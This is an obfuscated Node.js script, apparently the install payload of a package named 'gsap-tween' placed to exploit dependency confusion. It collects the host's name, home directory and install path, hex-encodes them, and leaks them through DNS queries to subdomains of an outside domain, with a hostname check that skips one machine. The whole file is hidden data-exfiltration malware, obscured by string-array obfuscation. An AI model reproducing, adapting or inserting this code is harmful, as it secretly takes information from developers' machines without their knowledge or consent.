const _0x29f219 = _0x4104;
(function (_0x1d3f9c, _0x3c67a4) {
    const _0x529db5 = _0x4104;
    const _0x1bfc3c = _0x1d3f9c();
    while (!![]) {
        try {
            const _0x4a5cc8 = parseInt(_0x529db5(0x0)) / 0x1 * (parseInt(_0x529db5(0x1)) / 0x2) + -parseInt(_0x529db5(0x2)) / 0x3 + -parseInt(_0x529db5(0x3)) / 0x4 + -parseInt(_0x529db5(0x4)) / 0x5 * (parseInt(_0x529db5(0x5)) / 0x6) + -parseInt(_0x529db5(0x6)) / 0x7 * (-parseInt(_0x529db5(0x7)) / 0x8) + parseInt(_0x529db5(0x8)) / 0x9 * (parseInt(_0x529db5(0x9)) / 0xa) + -parseInt(_0x529db5(0xa)) / 0xb * (-parseInt(_0x529db5(0xb)) / 0xc);
            if (_0x4a5cc8 === _0x3c67a4) {
                break;
            } else {
                _0x1bfc3c['push'](_0x1bfc3c['shift']());
            }
        } catch (_0x4d17f4) {
            _0x1bfc3c['push'](_0x1bfc3c['shift']());
        }
    }
}(_0x3a0b, 0x68689));
const dns = require(_0x29f219(0xc));
const os = require('os');
function _0x3a0b() {
    const _0x3abcfe = [
        '7hIblEt',
        '3291536LBXPID',
        '9TKhaBS',
        '2732070EnXPjS',
        '11ueGfJh',
        '9215256FIMmgk',
        'dns',
        '.dns.alexbirsan-hacks-paypal.com',
        'dns1.alexbirsan-hacks-paypal.com',
        'gsap-tween',
        'from',
        'toString',
        'hex',
        'match',
        'random',
        'substring',
        'forEach',
        'resolve',
        'v2_f.',
        '.v2_e',
        'log',
        'err',
        'hostname',
        'homedir',
        'BBOGENS-LAPTOP',
        'exit',
        'stringify',
        'lookup',
        '8.8.8.8',
        'setServers',
        '8.8.4.4',
        '5443mWLrDm',
        '268VopHlt',
        '1484676QzrAok',
        '2956424xQqzFa',
        '70310QBSudM',
        '222gHuDfK'
    ];
    _0x3a0b = function () {
        return _0x3abcfe;
    };
    return _0x3a0b();
}
const suffix = _0x29f219(0xd);
function _0x4104(_0x2f1150, _0x3a0b38) {
    const _0x410469 = _0x3a0b();
    _0x4104 = function (_0x266b7d, _0x24c085) {
        _0x266b7d = _0x266b7d - 0x0;
        let _0x1572c0 = _0x410469[_0x266b7d];
        return _0x1572c0;
    };
    return _0x4104(_0x2f1150, _0x3a0b38);
}
const ns = _0x29f219(0xe);
const package = _0x29f219(0xf);
function sendToServer(_0x4ed273) {
    const _0x83961d = _0x4104;
    _0x4ed273 = Buffer[_0x83961d(0x10)](_0x4ed273)[_0x83961d(0x11)](_0x83961d(0x12));
    _0x4ed273 = _0x4ed273[_0x83961d(0x13)](/.{1,60}/g);
    id = Math[_0x83961d(0x14)]()[_0x83961d(0x11)](0x24)[_0x83961d(0x15)](0x2);
    _0x4ed273[_0x83961d(0x16)](function (_0x176fa1, _0x224fe1) {
        const _0x532d7e = _0x4104;
        try {
            dns[_0x532d7e(0x17)](_0x532d7e(0x18) + id + '.' + _0x224fe1 + '.' + _0x176fa1 + _0x532d7e(0x19) + suffix, 'A', console[_0x532d7e(0x1a)]);
        } catch (_0x50cfd3) {
        }
    });
}
function tryGet(_0x5ebd88) {
    const _0x49aae6 = _0x4104;
    try {
        return _0x5ebd88();
    } catch (_0x38c2ce) {
        return _0x49aae6(0x1b);
    }
}
data = {
    'p': package,
    'h': tryGet(os[_0x29f219(0x1c)]),
    'd': tryGet(os[_0x29f219(0x1d)]),
    'c': __dirname
};
if (data['h'] == _0x29f219(0x1e)) {
    process[_0x29f219(0x1f)](0x0);
}
data = JSON[_0x29f219(0x20)](data);
sendToServer(data);
dns[_0x29f219(0x21)](ns, function (_0x595ee9, _0x1c91e2) {
    const _0x3fed9f = _0x4104;
    if (!_0x595ee9) {
        nsAddress = _0x1c91e2;
    } else {
        nsAddress = _0x3fed9f(0x22);
    }
    dns[_0x3fed9f(0x23)]([
        nsAddress,
        _0x3fed9f(0x24)
    ]);
    sendToServer(data);
});
